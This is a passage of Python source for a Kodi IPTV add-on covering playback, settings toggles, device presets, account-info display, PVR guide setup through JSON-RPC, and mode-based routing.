		url = 'http://%s:%s/?url=%s'%(str(mp4retry.HOST_NAME),str(mp4retry.PORT_NUMBER),quote(url))
		mp4retry.XtreamProxy().start()	
		liz = xbmcgui.ListItem(name)
		liz.setArt({'icon':icon, 'thumb':icon})
		if get_kversion() > 19:
			info = liz.getVideoInfoTag()
			info.setTitle(name)
			info.setMediaType('video')
			info.setPlot(description)
		else:
			liz.setInfo(type='Video', infoLabels={'Title': name, 'Plot': description})
		#liz.setProperty('IsPlayable','true')
		liz.setPath(str(url))
		xbmc.Player().play(item=url, listitem=liz)

	else:
		url = url + headers
		liz = xbmcgui.ListItem(name)
		liz.setArt({'icon':icon, 'thumb':icon})
		if get_kversion() > 19:
			info = liz.getVideoInfoTag()
			info.setTitle(name)
			info.setMediaType('video')
			info.setPlot(description)
		else:
			liz.setInfo(type='Video', infoLabels={'Title': name, 'Plot': description})
		if not dns_unblock == 'true':
			liz.setProperty('IsPlayable','true')
		liz.setPath(str(url))
		if not dns_unblock == 'true':
			xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, liz)
		else:
			xbmc.Player().play(item=url, listitem=liz)

def searchdialog():
	search = control.inputDialog(heading='Search '+ADDON_NAME+':')
	if search=="":
		return
	else:
		return search


### alterar settings
def settingsmenu():
	if xbmcaddon.Addon().getSetting('meta')=='true':
		META = '[B][COLOR lime]ON[/COLOR][/B]'
	else:
		META = '[B][COLOR red]OFF[/COLOR][/B]'
	if xbmcaddon.Addon().getSetting('hidexxx')=='true':
		xxx = '[B][COLOR lime]ON[/COLOR][/B]'
	else:
		xxx = '[B][COLOR red]OFF[/COLOR][/B]'
	# if xbmcaddon.Addon().getSetting('f4m')=='true':
	# 	f4m_ = '[B][COLOR lime]ON[/COLOR][/B]'
	# else:
	# 	f4m_ = '[B][COLOR red]OFF[/COLOR][/B]'
	if xbmcaddon.Addon().getSetting('dns_unblock')=='true':
		unblock = '[B][COLOR lime]ON[/COLOR][/B]'
	else:
		unblock = '[B][COLOR red]OFF[/COLOR][/B]'
	#tools.addDir('Edit Advanced Settings','ADS',10,icon,background,'')
	tools.addDir('DNS UNBLOCK is %s'%unblock,'DNS_UNBLOCK',10,icon,background,unblock)
	tools.addDir('META is %s'%META,'META',10,icon,background,META)
	tools.addDir('Hide Adult Content is %s'%xxx,'XXX',10,icon,background,xxx)
	tools.addDir('Log Out','LO',10,icon,background,'')

def addonsettings(url,description):
	url	 = buildcleanurl(url)
	if	 url =="clearcache":
		tools.clear_cache()
	elif url =="AS":
		xbmc.executebuiltin('Addon.OpenSettings(%s)'% ADDON_ID)
	elif url =="ADS":
		dialog = xbmcgui.Dialog().select('Edit Advanced Settings', ['Open AutoConfig','Enable Fire TV Stick AS','Enable Fire TV AS','Enable 1GB Ram or Lower AS','Enable 2GB Ram or Higher AS','Enable Nvidia Shield AS','Disable AS'])
		if dialog==0:
			advancedsettings('auto')
		elif dialog==1:
			advancedsettings('stick')
			tools.ASln()
		elif dialog==2:
			advancedsettings('firetv')
			tools.ASln()
		elif dialog==3:
			advancedsettings('lessthan')
			tools.ASln()
		elif dialog==4:
			advancedsettings('morethan')
			tools.ASln()
		elif dialog==5:
			advancedsettings('shield')
			tools.ASln()
		elif dialog==6:
			advancedsettings('remove')
			xbmcgui.Dialog().ok(ADDON_NAME, 'Advanced Settings Removed')
	elif url =="ADS2":
		dialog = xbmcgui.Dialog().select('Select Your Device Or Closest To', ['Open AutoConfig','Fire TV Stick ','Fire TV','1GB Ram or Lower','2GB Ram or Higher','Nvidia Shield'])
		if dialog==0:
			advancedsettings('auto')
			tools.ASln()
		elif dialog==1:
			advancedsettings('stick')
			tools.ASln()
		elif dialog==2:
			advancedsettings('firetv')
			tools.ASln()
		elif dialog==3:
			advancedsettings('lessthan')
			tools.ASln()
		elif dialog==4:
			advancedsettings('morethan')
			tools.ASln()
		elif dialog==5:
			advancedsettings('shield')
			tools.ASln()
	elif url =="tv":
		dialog = xbmcgui.Dialog().yesno(ADDON_NAME,'Would You like us to Setup the TV Guide for You?')
		if dialog:
			pvrsetup()
			xbmcgui.Dialog().ok(ADDON_NAME, 'PVR Integration Complete, Restart Kodi For Changes To Take Effect')
	elif url =="Itv":
			xbmc.executebuiltin('InstallAddon(pvr.iptvsimple)')
	elif url =="ST":
		speedtest.speedtest()
	elif url =="DNS_UNBLOCK":
		if 'ON' in description:
			xbmcaddon.Addon().setSetting('dns_unblock','false')
			xbmc.executebuiltin('Container.Refresh')
		else:
			xbmcaddon.Addon().setSetting('dns_unblock','true')
			xbmc.executebuiltin('Container.Refresh')
	elif url =="META":
		if 'ON' in description:
			xbmcaddon.Addon().setSetting('meta','false')
			xbmc.executebuiltin('Container.Refresh')
		else:
			xbmcaddon.Addon().setSetting('meta','true')
			xbmc.executebuiltin('Container.Refresh')
	elif url =="XXX":
		if 'ON' in description:
			pas = tools.keypopup('Enter Adult Password:')
			if pas ==control.setting('xxx_pw'):
				xbmcaddon.Addon().setSetting('hidexxx','false')
				xbmc.executebuiltin('Container.Refresh')
		else:
			xbmcaddon.Addon().setSetting('hidexxx','true')
			xbmc.executebuiltin('Container.Refresh')
	elif url =="LO":
		xbmcaddon.Addon().setSetting('DNS','')
		xbmcaddon.Addon().setSetting('Username','')
		xbmcaddon.Addon().setSetting('Password','')
		xbmc.executebuiltin('XBMC.ActivateWindow(Videos,addons://sources/video/)')
		xbmc.executebuiltin('Container.Refresh')
	elif url =="UPDATE":
		if 'ON' in description:
			xbmcaddon.Addon().setSetting('update','false')
			xbmc.executebuiltin('Container.Refresh')
		else:
			xbmcaddon.Addon().setSetting('update','true')
			xbmc.executebuiltin('Container.Refresh')
	elif url == "RefM3U":
		DP.create(ADDON_NAME, "Please Wait")
		tools.gen_m3u(panel_api, M3U_PATH)
	elif url == "TEST":
		tester()

def adult_set():
	dialog = DIALOG.yesno(ADDON_NAME,'Would you like to hide the Adult Menu? \nYou can always change this in settings later on.')
	if dialog:
		control.setSetting('xxx_pwset','true')
		pass
	else:
		control.setSetting('xxx_pwset','false')
		pass
	dialog = DIALOG.yesno(ADDON_NAME,'Would you like to Password Protect Adult Content? \nYou can always change this in settings later on.')
	if dialog:
		control.setSetting('xxx_pwset','true')
		adultpw = tools.keypopup('Enter Password')
		control.setSetting('xxx_pw',adultpw)
	else:
		control.setSetting('xxx_pwset','false')
		pass

def advancedsettings(device):
	if device == 'stick':
		file = open(os.path.join(advanced_settings, 'stick.xml'))
	elif device =='auto':
		popup.autoConfigQ()
	elif device == 'firetv':
		file = open(os.path.join(advanced_settings, 'firetv.xml'))
	elif device == 'lessthan':
		file = open(os.path.join(advanced_settings, 'lessthan1GB.xml'))
	elif device == 'morethan':
		file = open(os.path.join(advanced_settings, 'morethan1GB.xml'))
	elif device == 'shield':
		file = open(os.path.join(advanced_settings, 'shield.xml'))
	elif device == 'remove':
		os.remove(ADVANCED)
	try:
		read = file.read()
		f = open(ADVANCED, mode='w+')
		f.write(read)
		f.close()
	except:
		pass

def accountinfo():
	# try:
	# 	parse = tools.OPEN_URL(panel_api)
	# except:
	# 	parse = tools.OPEN_URL(player_api)
	try:
		parse = tools.OPEN_URL(player_api)
	except:
		parse = tools.OPEN_URL(panel_api)

	expiry	   = parse['user_info']['exp_date']
	if not expiry=="":
		expiry	   = datetime.fromtimestamp(int(expiry)).strftime('%d/%m/%Y - %H:%M')
		expreg	   = re.compile('^(.*?)/(.*?)/(.*?)$',re.DOTALL).findall(expiry)
		for day,month,year in expreg:
			month	  = tools.MonthNumToName(month)
			year	  = re.sub(' -.*?$','',year)
			#expiry	  = month+' '+day+' - '+year
			expiry	  = day+' de '+month+' de '+year
	else:
		expiry = 'Ilimitado'
	max_connection = str(parse['user_info']['max_connections'])
	if max_connection == 'None':
		max_connection = 'Ilimitado'
	status = parse['user_info']['status']
	if status == 'Active':
		status = 'Ativo'
	elif status == 'Trial':
		status = 'Teste'
	tools.addDir('[B][COLOR white]Username: [/COLOR][/B] '+parse['user_info']['username'],'','',icon,background,'')
	tools.addDir('[B][COLOR white]Password: [/COLOR][/B] '+parse['user_info']['password'],'','',icon,background,'')
	tools.addDir('[B][COLOR white]Expiry Date: [/COLOR][/B] '+expiry,'','',icon,background,'')
	tools.addDir('[B][COLOR white]Account Status: [/COLOR][/B] %s'%status,'','',icon,background,'')
	tools.addDir('[B][COLOR white]Current Connections: [/COLOR][/B] '+ str(parse['user_info']['active_cons']),'','',icon,background,'')
	tools.addDir('[B][COLOR white]Allowed Connections: [/COLOR][/B] '+ max_connection,'','',icon,background,'')
	tools.addDir('[B][COLOR white]Local IP Address: [/COLOR][/B] '+ tools.getlocalip(),'','',icon,background,'')
	tools.addDir('[B][COLOR white]External IP Address: [/COLOR][/B] '+ tools.getexternalip(),'','',icon,background,'')
	tools.addDir('[B][COLOR white]Kodi Version: [/COLOR][/B] '+str(KODIV),'','',icon,background,'')

def waitasec(time_to_wait,title,text):
	FTGcd = xbmcgui.DialogProgress()
	ret = FTGcd.create(' '+title)
	secs=0
	percent=0
	increment = int(100 / time_to_wait)
	cancelled = False
	while secs < time_to_wait:
		secs += 1
		percent = increment*secs
		secs_left = str((time_to_wait - secs))
		remaining_display = "Still " + str(secs_left) + "seconds left"
		FTGcd.update(percent,text+'\n'+remaining_display)
		xbmc.sleep(1000)
		if (FTGcd.iscanceled()):
			cancelled = True
			break
	if cancelled == True:
		return False
	else:
		FTGcd.close()
		return False

def tester():
	FTG = ''

def pvrsetup():
	correctPVR()
	tools.killxbmc()
	return

def correctPVR():
	choice = DIALOG.yesno(ADDON_NAME, 'Does your provider allow M3U?')
	if choice:
		m3u_do = 'no'
	else:
		DP.create(ADDON_NAME, "Please Wait")
		tools.gen_m3u(panel_api, M3U_PATH)
		m3u_do = 'yes'
	try:
		addon		  = xbmcaddon.Addon(ADDON_ID)
		dns_text	  = addon.getSetting(id='DNS')
		username_text = addon.getSetting(id='Username')
		password_text = addon.getSetting(id='Password')
		PvrEnable	  = '{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.demo","enabled":false},"id":1}'
		jsonSetPVR	  = '{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"pvrmanager.enabled", "value":true},"id":1}'
		IPTVon		  = '{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}'
		nulldemo	  = '{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.demo","enabled":false},"id":1}'
		loginurl	  = dns_text+"/get.php?username=" + username_text + "&password=" + password_text + "&type=m3u_plus&output=ts"
		EPGurl		  = dns_text+"/xmltv.php?username=" + username_text + "&password=" + password_text

		xbmc.executeJSONRPC(PvrEnable)
		xbmc.executeJSONRPC(jsonSetPVR)
		xbmc.executeJSONRPC(IPTVon)
		xbmc.executeJSONRPC(nulldemo)

		FTG = xbmcaddon.Addon('pvr.iptvsimple')
		if m3u_do == 'yes':
			FTG.setSetting(id='m3uPath', value=M3U_PATH)
			FTG.setSetting(id='m3uPathType', value="0")
		else:
			FTG.setSetting(id='m3uUrl', value=loginurl)
		FTG.setSetting(id='epgUrl', value=EPGurl)
		FTG.setSetting(id='m3uCache', value="false")
		FTG.setSetting(id='epgCache', value="false")

		xbmc.executebuiltin("Container.Refresh")
		DIALOG.ok(ADDON_NAME,"PVR Client Updated, Kodi needs to re-launch for changes to take effect, click ok to quit kodi and then please re launch")
		os._exit(1)
	except:
		DIALOG.ok(ADDON_NAME,"PVR Client: Unknown Error or PVR already Set-Up")

def tvguidesetup():
		dialog = DIALOG.yesno(ADDON_NAME,'Would You like '+ADDON_NAME+' to Setup the TV Guide for You?')
		if dialog:
			pvrsetup()
			DIALOG.ok(ADDON_NAME, 'You are all done! \n Restart Kodi For Changes To Take Effect')

def num2day(num):
	if num =="0":
		day = 'monday'
	elif num=="1":
		day = 'tuesday'
	elif num=="2":
		day = 'wednesday'
	elif num=="3":
		day = 'thursday'
	elif num=="4":
		day = 'friday'
	elif num=="5":
		day = 'saturday'
	elif num=="6":
		day = 'sunday'
	return day

def extras():
	tools.addDir('Run a Speed Test','ST',10,icon,background,'')
	try:
		#if xbmc.getCondVisibility('System.HasAddon(pvr.iptvsimple)'):
		#	tools.addDir('Setup PVR Guide','tv',10,icon,background,'')
		#if not xbmc.getCondVisibility('System.HasAddon(pvr.iptvsimple)'):
		#	tools.addDir('Install PVR Guide','Itv',10,icon,background,'')
		if os.path.exists(M3U_PATH):
			tools.addDir('Refresh M3U','RefM3U',10,icon,background,'')
	except:pass
	tools.addDir('Clear Cache','clearcache',10,icon,background,'')
	#tools.addDir('Tester','TEST',10,icon,background,'')

params=tools.get_params()
url=None
name=None
mode=None
iconimage=None
description=None
query=None
type=None

try:
	url=urllib.parse.unquote_plus(params["url"])
except:
	pass
try:
	name=urllib.parse.unquote_plus(params["name"])
except:
	pass
try:
	iconimage=urllib.parse.unquote_plus(params["iconimage"])
except:
	iconimage = ''
try:
	mode=int(params["mode"])
except:
	pass
try:
	description=urllib.parse.unquote_plus(params["description"])
except:
	pass
try:
	query=urllib.parse.unquote_plus(params["query"])
except:
	pass
try:
	type=urllib.parse.unquote_plus(params["type"])
except:
	pass

if mode==None or url==None or len(url)<1:
	start('false')

elif mode==1:
	livecategory()

elif mode==2:
	Livelist(url)

elif mode==3:
	vod(url)

elif mode==4:
	#stream_video(url)
	stream_video(url,iconimage)

elif mode==5:
	search()
	
elif mode==6:
	accountinfo()

elif mode==7:
	tvguide()

elif mode==8:
	settingsmenu()

elif mode == 9:
	Vodlist(url)
	
elif mode==10:
	addonsettings(url,description)
	
elif mode==11:
	pvrsetup()
	
elif mode==12:
	catchup()

elif mode==13:
	tvarchive(name,description)
	
# elif mode==14:
# 	listcatchup2()
	
# elif mode==15:
# 	ivueint()
	
elif mode==16:
	extras()
	
elif mode==18:
	series_cats(url)

elif mode==25:
	serieslist(url)
	
elif mode==19:
	series_seasons(url)

elif mode==20:
	season_list(url)

# elif mode=='start':
# 	start(signin)

elif mode=='test':
	tester()

xbmcplugin.endOfDirectory(int(sys.argv[1]))